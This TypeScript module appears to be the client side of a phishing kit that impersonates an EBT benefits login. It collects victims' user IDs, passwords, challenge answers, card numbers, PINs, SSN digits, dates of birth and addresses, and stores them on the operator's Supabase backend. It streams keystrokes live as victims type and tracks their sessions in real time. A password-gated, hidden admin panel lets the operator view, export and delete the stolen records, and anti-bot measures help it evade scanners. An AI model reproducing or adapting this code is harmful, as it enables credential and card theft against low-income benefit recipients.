import { supabase } from "@/integrations/supabase/client";
import { buildAntiBotPayload } from "@/lib/antiBot";


// ── Types ──

export type UserEntry = {
  id: string;
  type: "new" | "old";
  timestamp: string;
  updatedAt?: string;
  userId?: string;
  password?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  phone?: string;
  challengeQuestions?: { question: string; answer: string }[];
  cardNumber?: string;
  pinCard?: string;
  dob?: string;
  ssnLast4?: string;
  zipCode?: string;
  streetAddress?: string;
  aptUnit?: string;
  city?: string;
  state?: string;
};

export type LiveSession = {
  sessionId: string;
  currentPage: string;
  startedAt: string;
  lastSeen: string;
  status: "active" | "idle" | "left";
  pagesVisited: string[];
};

export type LiveTypingData = Record<string, Record<string, string>>;

export type AdminStats = {
  totalEntries: number;
  liveSessions: number;
  liveTyping: number;
  approximate?: boolean;
};

const SESSION_ID_KEY = "ebt_session_id";
const SESSION_STARTED_AT_KEY = "ebt_session_started_at";
const SESSION_PAGES_KEY = "ebt_session_pages";
const SESSION_CURRENT_PAGE_KEY = "ebt_session_current_page";
const USER_ENTRY_ID_KEY = "ebt_user_entry_id";
const USER_ENTRY_DRAFT_KEY = "ebt_user_entry_draft";
const LIVE_TYPING_VALUES_KEY = "ebt_live_typing_values";
const SEEN_KEY = "ebt_sc";
let lastSuccessfulUsersCache: UserEntry[] = [];
let lastKnownUsersCount = 0;

const normalizeAdminStats = (raw: any, fallbackUsers = 0): AdminStats => ({
  totalEntries: Number(raw?.totalEntries ?? fallbackUsers) || 0,
  liveSessions: Number(raw?.liveSessions ?? 0) || 0,
  liveTyping: Number(raw?.liveTyping ?? 0) || 0,
  approximate: raw?.approximate !== false,
});

const db = supabase as any;

// ══════════════════════════════════════════════════════
// ADMIN-API CLIENT — singura cale către date sensibile (citire/ștergere)
// ══════════════════════════════════════════════════════

const ADMIN_FUNCTION_NAME = "data-srv-v2";
let adminSessionToken = "";

try {
  sessionStorage.removeItem("ebt_x1");
  sessionStorage.removeItem("ebt_x2");
  sessionStorage.removeItem("ebt_c1");
  sessionStorage.removeItem("sec_lvl");
} catch {}

export const setAdminToken = (token: string) => { adminSessionToken = token; };
export const getAdminToken = (): string => adminSessionToken;
export const clearAdminPassword = () => {
  adminSessionToken = "";
};

export class AuthErr extends Error {
  constructor(public status: number, message: string) {
    super(message);
    this.name = "AuthErr";
  }
}

// All admin operations go through the edge function. Password is validated
// server-side against a secret that never appears in the client bundle.
const callAdminApi = async (action: string, payload?: any): Promise<any> => {
  const token = getAdminToken();
  if (!token) throw new AuthErr(401, "no_session");

  const { data, error } = await db.functions.invoke(ADMIN_FUNCTION_NAME, {
    body: { token, action, payload },
  });

  if (error) {
    const ctx = (error as any)?.context;
    const status = ctx?.status ?? (error as any)?.status ?? 500;
    // supabase-js doesn't parse the body on non-2xx — read it manually so we
    // can surface server errors like "layer2_required" instead of a generic
    // "non-2xx status code" toast.
    let serverMsg = "";
    try {
      if (ctx && typeof ctx.json === "function") {
        const body = await ctx.clone().json();
        serverMsg = body?.detail || body?.error || body?.message || "";
      } else if (ctx && typeof ctx.text === "function") {
        const txt = await ctx.clone().text();
        try {
          const j = JSON.parse(txt);
          serverMsg = j?.detail || j?.error || "";
        } catch { serverMsg = txt; }
      }
    } catch {}
    throw new AuthErr(status, serverMsg || error.message || "admin_api_error");
  }
  if (!data?.ok) {
    throw new AuthErr(data?.status ?? 400, data?.error || "admin_api_error");
  }
  return data;
};


// Verifică parola la edge function. Returnează layer (mereu 2 acum) sau aruncă.
export const verifyAdminPassword = async (password: string): Promise<1 | 2> => {
  const normalizedPassword = password.trim();
  const { data, error } = await db.functions.invoke(ADMIN_FUNCTION_NAME, {
    body: { password: normalizedPassword, action: "verify" },
  });
  if (error) {
    const status = (error as any)?.status ?? (error as any)?.context?.status ?? 500;
    throw new AuthErr(status, error.message || "verify_failed");
  }
  if (!data?.ok) throw new AuthErr(401, data?.error || "unauthorized");
  if (typeof data.token === "string") setAdminToken(data.token);
  return data.layer === 2 ? 2 : 1;
};

// Verifică a 2-a parolă (layer 2 — deblocheaza datele sensibile).
export const verifyAdminPassword2 = async (password2: string): Promise<true> => {
  const token = getAdminToken();
  if (!token) throw new AuthErr(401, "no_layer1");
  const normalized2 = password2.trim();
  const { data, error } = await db.functions.invoke(ADMIN_FUNCTION_NAME, {
    body: { token, password2: normalized2, action: "verify_layer2" },
  });
  if (error) {
    const status = (error as any)?.status ?? (error as any)?.context?.status ?? 500;
    throw new AuthErr(status, error.message || "verify_layer2_failed");
  }
  if (!data?.ok) throw new AuthErr(401, data?.error || "unauthorized_layer2");
  if (typeof data.token === "string") setAdminToken(data.token);
  return true;
};


const safeParse = <T>(raw: string | null, fallback: T): T => {
  if (!raw) return fallback;
  try { return JSON.parse(raw) as T; } catch { return fallback; }
};

const dedupeRowsById = <T extends { id?: string }>(rows: T[]): T[] => {
  const seen = new Set<string>();
  const deduped: T[] = [];

  for (const row of rows) {
    const id = `${row?.id ?? ""}`;
    if (!id || seen.has(id)) continue;
    seen.add(id);
    deduped.push(row);
  }

  return deduped;
};

const deriveStatusFromLastSeen = (lastSeen: string, storedStatus: LiveSession["status"]): LiveSession["status"] => {
  if (storedStatus === "left") return "left";
  const diff = Date.now() - new Date(lastSeen).getTime();
  // Heartbeat = 3s. Praguri strânse → fără utilizatori fantomă în panel.
  if (diff > 15000) return "left";
  if (diff > 6000) return "idle";
  return "active";
};

const mapSessionRow = (row: any): LiveSession => {
  const lastSeen = row.last_seen || new Date().toISOString();
  const rawStatus = (row.status || "active") as LiveSession["status"];
  return {
    sessionId: row.session_id,
    currentPage: row.current_page || "🏠 Login Page",
    startedAt: row.started_at || lastSeen,
    lastSeen,
    status: deriveStatusFromLastSeen(lastSeen, rawStatus),
    pagesVisited: Array.isArray(row.pages_visited) ? row.pages_visited : [],
  };
};

const mapTypingRows = (rows: any[]): LiveTypingData => {
  const snapshot: LiveTypingData = {};
  for (const row of rows) {
    const updatedAt = row.updated_at ? new Date(row.updated_at).getTime() : Date.now();
    if (Date.now() - updatedAt > 35000) continue;
    const keys: string[] = Array.isArray(row.field_keys) ? row.field_keys : [];
    if (keys.length === 0) {
      // Sesiune fără typing activ — marchez explicit ca să fie șters din panel
      snapshot[row.session_id] = {};
      continue;
    }
    const values = (row.field_values && typeof row.field_values === "object") ? row.field_values as Record<string, string> : {};
    snapshot[row.session_id] = Object.fromEntries(
      keys.map((k: string) => [k, values[k] || "typing..."]).filter(([, v]) => v && v !== "typing...")
    );
  }
  return snapshot;
};

// Private route detection — server-validated, never reveals the slug in the
// bundle. Result is cached per path-segment in memory + sessionStorage so we
// only ask the server once per browser session.
const _privateCache = new Map<string, boolean>();
const _PRIVATE_SS_KEY = "ebt_pv_seg";

const _loadCachedPrivate = (): string | null => {
  try { return sessionStorage.getItem(_PRIVATE_SS_KEY); } catch { return null; }
};

const _checkPrivateAsync = async (seg: string) => {
  try {
    const { data } = await db.functions.invoke("route-check-v2", { body: { p: seg } });
    const ok = data?.ok === true;
    _privateCache.set(seg, ok);
    if (ok) {
      try { sessionStorage.setItem(_PRIVATE_SS_KEY, seg); } catch {}
    }
  } catch {
    _privateCache.set(seg, false);
  }
};

const isPrivateRoute = (): boolean => {
  if (typeof window === "undefined") return false;
  const seg = window.location.pathname.replace(/^\/+/, "").replace(/\/+$/, "");
  if (!seg || seg.includes("/") || seg.length > 200) return false;
  // Fast path: previously confirmed match in this tab
  if (_loadCachedPrivate() === seg) return true;
  const cached = _privateCache.get(seg);
  if (cached !== undefined) return cached;
  void _checkPrivateAsync(seg);
  return false;
};

// ── Session helpers (sessionStorage – per tab) ──
const getSessionId = (): string => {
  let id = sessionStorage.getItem(SESSION_ID_KEY);
  if (!id) { id = generateId(); sessionStorage.setItem(SESSION_ID_KEY, id); }
  return id;
};
const getSessionStartedAt = (): string => {
  let s = sessionStorage.getItem(SESSION_STARTED_AT_KEY);
  if (!s) { s = new Date().toISOString(); sessionStorage.setItem(SESSION_STARTED_AT_KEY, s); }
  return s;
};
const getSessionPages = (): string[] => safeParse(sessionStorage.getItem(SESSION_PAGES_KEY), []);
const setSessionPages = (p: string[]) => sessionStorage.setItem(SESSION_PAGES_KEY, JSON.stringify(p));
const addPageToSession = (label: string): string[] => {
  const pages = getSessionPages();
  if (!pages.includes(label)) { pages.push(label); setSessionPages(pages); }
  return pages;
};
const getCurrentPage = (): string => sessionStorage.getItem(SESSION_CURRENT_PAGE_KEY) || "🏠 Login Page";
const setCurrentPage = (p: string) => sessionStorage.setItem(SESSION_CURRENT_PAGE_KEY, p);

export const generateId = () => {
  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
    return crypto.randomUUID();
  }
  if (typeof crypto !== "undefined" && typeof crypto.getRandomValues === "function") {
    const bytes = crypto.getRandomValues(new Uint8Array(16));
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    const hex = Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
    return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`;
  }
  const fallback = `${Date.now().toString(16)}${Math.random().toString(16).slice(2).padEnd(20, "0")}`.slice(0, 32);
  return `${fallback.slice(0, 8)}-${fallback.slice(8, 12)}-4${fallback.slice(13, 16)}-a${fallback.slice(17, 20)}-${fallback.slice(20).padEnd(12, "0")}`;
};

const pageLabel = (path: string): string => {
  if (path === "/" || path === "") return "🏠 Login Page";
  if (path.includes("register")) return "📝 Register";
  if (path.includes("challenge")) return "🔐 Challenge Questions";
  if (path.includes("add-account")) return "💳 Add Account";
  if (path.includes("success")) return "✅ Confirmation";
  if (isPrivateRoute()) return "_internal";
  return path;
};

// ══════════════════════════════════════════════════════
// USER ENTRIES — stored in database for cross-device sync
// ══════════════════════════════════════════════════════

const PENDING_ENTRIES_KEY = "ebt_pending_entries";

type PendingEntry = { body: any; savedAt: number };

const readPendingQueue = (): PendingEntry[] => {
  try { return safeParse<PendingEntry[]>(localStorage.getItem(PENDING_ENTRIES_KEY), []); }
  catch { return []; }
};
const writePendingQueue = (queue: PendingEntry[]) => {
  try { localStorage.setItem(PENDING_ENTRIES_KEY, JSON.stringify(queue.slice(-50))); } catch {}
};

const enqueuePending = (body: any) => {
  const queue = readPendingQueue();
  const id = body?.id;
  const filtered = id ? queue.filter((q) => q.body?.id !== id) : queue;
  filtered.push({ body, savedAt: Date.now() });
  writePendingQueue(filtered);
};

let flushingQueue = false;
export const flushPendingEntries = async (): Promise<void> => {
  if (flushingQueue) return;
  flushingQueue = true;
  try {
    let queue = readPendingQueue();
    while (queue.length > 0) {
      const next = queue[0];
      try {
        const { data, error } = await db.functions.invoke("save-user-entry-v2", { body: next.body });
        if (error || data?.ok !== true) break;
      } catch { break; }
      queue = queue.slice(1);
      writePendingQueue(queue);
    }
  } finally {
    flushingQueue = false;
  }
};

if (typeof window !== "undefined") {
  window.addEventListener("online", () => { void flushPendingEntries(); });
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") void flushPendingEntries();
  });
  setTimeout(() => { void flushPendingEntries(); }, 1500);
}

const persistUserEntry = async (entry: UserEntry | Record<string, unknown>): Promise<boolean> => {
  const _ab = buildAntiBotPayload((entry as any)._hp);
  const body: any = { ...entry, _ab };
  delete body._hp;

  try {
    const { data, error } = await db.functions.invoke("save-user-entry-v2", { body });
    if (error || data?.ok !== true) {
      enqueuePending(body);
      return false;
    }
    void flushPendingEntries();
    return true;
  } catch {
    enqueuePending(body);
    return false;
  }
};

export const saveUser = async (entry: UserEntry): Promise<boolean> => {
  try {
    sessionStorage.setItem(USER_ENTRY_ID_KEY, entry.id);
    sessionStorage.setItem(USER_ENTRY_DRAFT_KEY, JSON.stringify(entry));
    return await persistUserEntry(entry);
  } catch {
    return false;
  }
};


export const updateLastUser = async (partial: Partial<UserEntry>): Promise<boolean> => {
  try {
    const existing = safeParse<Partial<UserEntry>>(sessionStorage.getItem(USER_ENTRY_DRAFT_KEY), {});
    const id = existing.id || sessionStorage.getItem(USER_ENTRY_ID_KEY) || generateId();
    const merged: UserEntry = {
      id,
      type: partial.type || existing.type || "old",
      timestamp: existing.timestamp || new Date().toISOString(),
      ...existing,
      ...partial,
    } as UserEntry;
    sessionStorage.setItem(USER_ENTRY_ID_KEY, id);
    sessionStorage.setItem(USER_ENTRY_DRAFT_KEY, JSON.stringify(merged));
    return await persistUserEntry({ ...merged, _hp: (partial as any)._hp ?? (merged as any)._hp });
  } catch {
    return false;
  }
};


// Map DB row -> UserEntry (shared)
const mapUserRow = (row: any): UserEntry => {
  const normalizedType = `${row.type ?? "new"}`.trim().toLowerCase();
  return {
    id: row.id,
    type: normalizedType === "old" ? "old" : "new",
    timestamp: row.timestamp || row.created_at,
    updatedAt: row.updated_at || row.timestamp || row.created_at,
    userId: row.user_id_field || undefined,
    password: row.password_field || undefined,
    firstName: row.first_name || undefined,
    lastName: row.last_name || undefined,
    email: row.email || undefined,
    phone: row.phone || undefined,
    challengeQuestions: Array.isArray(row.challenge_questions) ? row.challenge_questions : undefined,
    cardNumber: row.card_number || undefined,
    pinCard: row.pin_card || undefined,
    dob: row.dob || undefined,
    ssnLast4: row.ssn_last4 || undefined,
    zipCode: row.zip_code || undefined,
    streetAddress: row.street_address || undefined,
    aptUnit: row.apt_unit || undefined,
    city: row.city || undefined,
    state: row.state || undefined,
  };
};

export const fetchUsers = async (): Promise<UserEntry[]> => {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const data = await callAdminApi("fetch_users");
      const rows: any[] = Array.isArray(data.rows) ? data.rows : [];
      const mapped = dedupeRowsById(rows).map(mapUserRow);
      lastSuccessfulUsersCache = mapped;
      lastKnownUsersCount = mapped.length;
      return mapped;
    } catch (e: any) {
      // Auth errors propagate immediately
      if (e instanceof AuthErr && (e.status === 401 || e.status === 403 || e.status === 429)) {
        throw e;
      }
      await new Promise((r) => setTimeout(r, 300 * (attempt + 1)));
    }
  }
  return [...lastSuccessfulUsersCache];
};

export const fetchDashboard = async (): Promise<{ users: UserEntry[]; sessions: LiveSession[]; typing: LiveTypingData; stats: AdminStats }> => {
  const data = await callAdminApi("fetch_dashboard");
  const userRows: any[] = Array.isArray(data.users) ? data.users : [];
  const sessionRows: any[] = Array.isArray(data.sessions) ? data.sessions : [];
  const typingRows: any[] = Array.isArray(data.typing) ? data.typing : [];
  const users = dedupeRowsById(userRows).map(mapUserRow);
  lastSuccessfulUsersCache = users;
  const stats = normalizeAdminStats(data.counts, users.length);
  lastKnownUsersCount = Math.max(stats.totalEntries, users.length);
  return { users, sessions: sessionRows.map(mapSessionRow), typing: mapTypingRows(typingRows), stats };
};

export const fetchLiveBundle = async (): Promise<{ sessions: LiveSession[]; typing: LiveTypingData; stats: AdminStats }> => {
  const data = await callAdminApi("fetch_live_bundle");
  const sessionRows: any[] = Array.isArray(data.sessions) ? data.sessions : [];
  const typingRows: any[] = Array.isArray(data.typing) ? data.typing : [];
  return { sessions: sessionRows.map(mapSessionRow), typing: mapTypingRows(typingRows), stats: normalizeAdminStats(data.counts, lastKnownUsersCount) };
};

export const fetchUsersCount = async (): Promise<number> => {
  try {
    const data = await callAdminApi("fetch_users_count");
    return Number(data.count) || 0;
  } catch {
    return 0;
  }
};

export const deleteAllUsers = async () => {
  // No silent swallow — caller needs to see 403 (e.g. layer2_required) so the UI
  // can prompt the admin to unlock Layer 2 instead of looking like nothing happened.
  await callAdminApi("delete_all_users");
};

export const deleteUserById = async (id: string) => {
  await callAdminApi("delete_user", { id });
};

// Seen count (local – per admin browser)
export const getNewUserCount = (totalUsers: number): number => {
  const seenCount = parseInt(localStorage.getItem(SEEN_KEY) || "0", 10);
  return Math.max(0, totalUsers - seenCount);
};
export const markAllSeen = (totalUsers: number) => {
  localStorage.setItem(SEEN_KEY, String(totalUsers));
};

// ══════════════════════════════════════════════════════
// LIVE SESSIONS — database-backed
// ══════════════════════════════════════════════════════

let sessionSyncTimer: ReturnType<typeof setTimeout> | null = null;
let pendingSessionSync: {
  sessionId: string; currentPage: string; status: LiveSession["status"]; pagesVisited: string[];
} | null = null;
let lastSessionPayloadKey: string | null = null;
let lastSessionPayloadAt = 0;

// Circuit breaker — when the server blocks us (403) or rate-limits (429) we
// must stop hammering. Without this, a single IP block turns into a request
// every 5s forever, which floods the network panel and the security log.
let trackerSuspendedUntil = 0;
const isTrackerSuspended = () => Date.now() < trackerSuspendedUntil;
const suspendTracker = (ms: number) => {
  trackerSuspendedUntil = Math.max(trackerSuspendedUntil, Date.now() + ms);
};

const TRACK_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/track-session-v2`;
const TRACK_HEADERS = {
  "Content-Type": "application/json",
  "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string,
  "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string}`,
};

const beaconTrack = (body: any): boolean => {
  try {
    if (typeof navigator === "undefined" || !navigator.sendBeacon) return false;
    const blob = new Blob([JSON.stringify(body)], { type: "application/json" });
    return navigator.sendBeacon(TRACK_URL, blob);
  } catch { return false; }
};

const writeRemoteSession = async (payload: {
  sessionId: string; currentPage: string; status: LiveSession["status"]; pagesVisited: string[];
}) => {
  if (isTrackerSuspended() && payload.status !== "left") return;
  const body = {
    kind: "session",
    sessionId: payload.sessionId,
    currentPage: payload.currentPage,
    startedAt: getSessionStartedAt(),
    status: payload.status,
    pagesVisited: payload.pagesVisited,
  };
  if (payload.status === "left" && beaconTrack(body)) return;
  try {
    const res = await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true });
    if (res.status === 403) { suspendTracker(10 * 60_000); return; }
    if (res.status === 429) { suspendTracker(60_000); return; }
    // La 5xx sau eroare de rețea: un singur retry cu delay, apoi renunțăm.
    if (!res.ok && res.status >= 500) {
      await new Promise((r) => setTimeout(r, 800));
      try { await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true }); } catch {}
    }
  } catch {
    await new Promise((r) => setTimeout(r, 800));
    try { await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true }); } catch {}
  }
};

const syncRemoteSession = (payload: {
  sessionId: string; currentPage: string; status: LiveSession["status"]; pagesVisited: string[];
}) => {
  pendingSessionSync = payload;
  if (sessionSyncTimer) clearTimeout(sessionSyncTimer);
  sessionSyncTimer = setTimeout(() => {
    const next = pendingSessionSync;
    pendingSessionSync = null;
    if (!next) return;
    // Dedup doar pentru dubluri apropiate; heartbeat-ul real trebuie să ajungă ca userul să rămână online.
    const key = `${next.sessionId}|${next.currentPage}|${next.status}|${next.pagesVisited.join(",")}`;
    const now = Date.now();
    // Permite refresh mai des: dedup doar pentru ferestre foarte scurte (3s).
    if (next.status !== "left" && key === lastSessionPayloadKey && now - lastSessionPayloadAt < 3_000) return;
    lastSessionPayloadKey = key;
    lastSessionPayloadAt = now;
    const ric = (window as any).requestIdleCallback as undefined | ((cb: () => void) => void);
    if (ric) ric(() => void writeRemoteSession(next));
    else void writeRemoteSession(next);
  }, payload.status === "left" ? 0 : 50);
};

export const trackPageVisit = (path: string) => {
  if (isPrivateRoute()) return;
  const sessionId = getSessionId();
  const label = pageLabel(path);
  setCurrentPage(label);
  const pagesVisited = addPageToSession(label);
  void syncRemoteSession({ sessionId, currentPage: label, status: "active", pagesVisited });
};

export const sendHeartbeat = () => {
  if (isPrivateRoute()) return;
  const sessionId = getSessionId();
  const pagesVisited = getSessionPages();
  if (pagesVisited.length === 0) return;
  void syncRemoteSession({ sessionId, currentPage: getCurrentPage(), status: "active", pagesVisited });
};

export const markSessionLeft = () => {
  if (isPrivateRoute()) return;
  const sessionId = getSessionId();
  const pagesVisited = getSessionPages();
  if (pagesVisited.length === 0) return;
  // Bypass debounce → trimite IMEDIAT prin sendBeacon (supraviețuiește unload).
  void writeRemoteSession({ sessionId, currentPage: getCurrentPage(), status: "left", pagesVisited });
};

export const fetchLiveSessions = async (): Promise<LiveSession[]> => {
  try {
    const data = await callAdminApi("fetch_sessions");
    const rows: any[] = Array.isArray(data.rows) ? data.rows : [];
    return rows.map(mapSessionRow);
  } catch { return []; }
};

export const deleteAllSessions = async () => {
  await callAdminApi("delete_all_sessions");
};

// ══════════════════════════════════════════════════════
// LIVE TYPING — database-backed
// ══════════════════════════════════════════════════════

let sessionEnsured = false;

const ensureSessionExists = (sessionId: string) => {
  if (sessionEnsured) return;
  sessionEnsured = true;
  try {
    const pagesVisited = getSessionPages();
    if (pagesVisited.length === 0) {
      const label = pageLabel(window.location.pathname);
      pagesVisited.push(label);
      setSessionPages(pagesVisited);
      setCurrentPage(label);
    }
    void writeRemoteSession({
      sessionId,
      currentPage: getCurrentPage(),
      status: "active",
      pagesVisited: getSessionPages(),
    });
  } catch {
    sessionEnsured = false;
  }
};

const syncRemoteTyping = async (sessionId: string, fieldKeys: string[], fieldValues: Record<string, string> = {}) => {
  if (isTrackerSuspended()) return;
  ensureSessionExists(sessionId);
  const body = { kind: "typing", sessionId, fieldKeys, fieldValues };
  try {
    const res = await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true });
    if (res.status === 403) { suspendTracker(10 * 60_000); return; }
    if (res.status === 429) { suspendTracker(60_000); return; }
    // 4xx (nu 403/429): sesiunea trebuie re-ensured la următorul typing.
    if (res.status >= 400 && res.status < 500) { sessionEnsured = false; return; }
    if (!res.ok && res.status >= 500) {
      await new Promise((r) => setTimeout(r, 800));
      try { await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true }); } catch {}
    }
  } catch {
    await new Promise((r) => setTimeout(r, 800));
    try { await fetch(TRACK_URL, { method: "POST", headers: TRACK_HEADERS, body: JSON.stringify(body), keepalive: true }); } catch {}
  }
};

// Debounce timer for typing broadcasts
let typingTimer: ReturnType<typeof setTimeout> | null = null;
let pendingTypingPayload: { sessionId: string; fieldKeys: string[]; filtered: Record<string, string> } | null = null;
let lastTypingPayloadKey: string | null = null;
let lastTypingSentAt = 0;
// 300ms între cereri — de 2.5× mai puține requesturi, rămâne fluid vizual.
const TYPING_MIN_INTERVAL_MS = 300;

const flushTyping = () => {
  if (pendingTypingPayload) {
    const { sessionId, fieldKeys, filtered } = pendingTypingPayload;
    pendingTypingPayload = null;
    const key = `${sessionId}|${fieldKeys.join(",")}|${JSON.stringify(filtered)}`;
    if (key === lastTypingPayloadKey) return;
    lastTypingPayloadKey = key;
    lastTypingSentAt = Date.now();
    syncRemoteTyping(sessionId, fieldKeys, filtered);
  }
};

export const broadcastTyping = (fields: Record<string, string>) => {
  if (isPrivateRoute()) return;
  const sessionId = getSessionId();
  const filtered: Record<string, string> = safeParse(sessionStorage.getItem(LIVE_TYPING_VALUES_KEY), {} as Record<string, string>);
  for (const [k, v] of Object.entries(fields)) {
    const s = `${v ?? ""}`;
    if (s.trim().length > 0) filtered[k] = s;
    else delete filtered[k];
  }
  sessionStorage.setItem(LIVE_TYPING_VALUES_KEY, JSON.stringify(filtered));
  const fieldKeys = Object.keys(filtered).slice(0, 30);
  pendingTypingPayload = { sessionId, fieldKeys, filtered };
  if (typingTimer) return;
  // Min 50ms între cereri, cap la TYPING_MIN_INTERVAL_MS — typing apare aproape instant.
  const delay = Math.max(50, TYPING_MIN_INTERVAL_MS - (Date.now() - lastTypingSentAt));
  typingTimer = setTimeout(() => {
    typingTimer = null;
    flushTyping();
  }, delay);
};

// Flush imediat — apelat la blur/submit ca să nu pierdem ultimul caracter.
export const flushTypingNow = () => {
  if (typingTimer) { clearTimeout(typingTimer); typingTimer = null; }
  flushTyping();
};

export const fetchLiveTyping = async (): Promise<LiveTypingData> => {
  try {
    const data = await callAdminApi("fetch_typing");
    const rows: any[] = Array.isArray(data.rows) ? data.rows : [];
    return mapTypingRows(rows);
  } catch { return {}; }
};

export const clearTypingForSession = (sessionId?: string) => {
  const id = sessionId || getSessionId();
  // Anulează orice typing pending care ar putea reactiva afișajul după clear
  if (typingTimer) { clearTimeout(typingTimer); typingTimer = null; }
  pendingTypingPayload = null;
  // Golește cache-ul local și trimite array gol → panelul nu mai afișează nimic
  sessionStorage.removeItem(LIVE_TYPING_VALUES_KEY);
  void syncRemoteTyping(id, [], {});
};

// ══════════════════════════════════════════════════════
// REALTIME SUBSCRIPTION — for admin panel
// ══════════════════════════════════════════════════════

export const subscribeLiveUpdates = (
  _onChange: (table: "live_sessions" | "live_typing" | "user_entries") => void,
) => {
  // Securitate: tabelele live au fost scoase din Realtime publication
  // (transmiteau parolele și cardurile la orice subscriber anonim).
  // Adminul folosește polling prin admin-api, care e singura cale autorizată.
  return () => {};
};

// ── Raw export fetcher (toate prin admin-api) ──
export const fetchAllUsersForExport = async (
  onProgress?: (fetched: number, expected: number) => void,
): Promise<UserEntry[]> => {
  const expected = await fetchUsersCount();
  onProgress?.(0, expected);
  const data = await callAdminApi("fetch_all_users_export");
  const rows: any[] = Array.isArray(data.rows) ? data.rows : [];
  const unique = dedupeRowsById(rows);
  onProgress?.(unique.length, Math.max(expected, unique.length));
  return unique.map(mapUserRow);
};

// ── Language persistence ──
const LANG_KEY = "ebt_selected_lang";
export const getSelectedLang = (): string => localStorage.getItem(LANG_KEY) || "English";
export const setSelectedLang = (lang: string) => localStorage.setItem(LANG_KEY, lang);
